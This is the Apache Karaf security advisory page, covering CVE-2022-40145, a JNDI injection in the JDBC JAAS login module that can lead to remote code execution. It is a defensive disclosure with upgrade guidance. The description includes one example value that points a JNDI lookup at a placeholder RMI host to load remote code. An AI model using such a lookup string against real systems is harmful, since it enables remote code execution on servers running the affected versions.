---
title: Apache Karaf security advisories
description: Security information for Apache Karaf
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache Karaf? Send your report to the  [Apache Security Team](mailto:security@apache.org).

# Advisories

This page is experimental: it provides consistent access to the advisories for Apache Karaf since 2023 in text and CVE JSON format. It may lag slighly behind the official CVE publications. 

If you have any feedback on how you would like this data to be presented, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)

## JDBC JAAS LDAP injection ## { #CVE-2022-40145 }

[CVE-2022-40145](./CVE-2022-40145.cve.json)

### Affected

* Apache Karaf versions 4.4.0 before 4.4.2 before 4.3.8


### Description

<span style="background-color: rgb(255, 255, 255);">This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.<br><br>The function jaas.modules.src.main.java.por</span><span style="background-color: rgb(255, 255, 255);">g.apache.karaf.jass.modules.</span><span style="background-color: rgb(255, 255, 255);">jdbc.JDBCUtils#doCreateDatasou</span><span style="background-color: rgb(255, 255, 255);">rce</span><br><span style="background-color: rgb(255, 255, 255);">use InitialContext.lookup(jndiName</span><span style="background-color: rgb(255, 255, 255);">) without filtering.<br>An user can modify&nbsp;</span><span style="background-color: rgb(255, 255, 255);">`options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE, "osgi:" +&nbsp;</span><span style="background-color: rgb(255, 255, 255);">DataSource.class.getName());` to `options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE,</span><span style="background-color: rgb(255, 255, 255);">"jndi:rmi://x.x.x.x:xxxx/Comma</span><span style="background-color: rgb(255, 255, 255);">nd");` in JdbcLoginModuleTest#setup.</span><br><br><span style="background-color: rgb(255, 255, 255);">This is vulnerable to a remote code execution (RCE) attack when a</span><br><span style="background-color: rgb(255, 255, 255);">configuration uses a JNDI LDAP data source URI when an attacker has</span><br><span style="background-color: rgb(255, 255, 255);">control of the target LDAP server.</span><p>This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.</p>We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8